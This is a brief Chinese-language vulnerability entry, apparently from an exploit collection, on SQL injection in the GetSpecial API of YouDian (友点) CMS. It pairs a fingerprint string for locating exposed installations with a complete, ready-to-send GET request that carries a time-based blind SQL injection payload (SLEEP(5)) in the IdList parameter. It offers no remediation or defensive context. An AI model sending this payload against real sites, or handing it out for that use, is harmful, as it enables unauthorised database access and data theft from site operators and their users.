# 友点CMS-GetSpecial接口存在SQL注入漏洞

友点CMS-GetSpecial接口 ｜ SQL注入 ｜ —
- **指纹**：`app="友点建站-CMS"`
- **请求**：`GET /index.php/api/GetSpecial?debug=1&ChannelID=1&IdList=1,1%29%20and%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29A HTTP/1.1`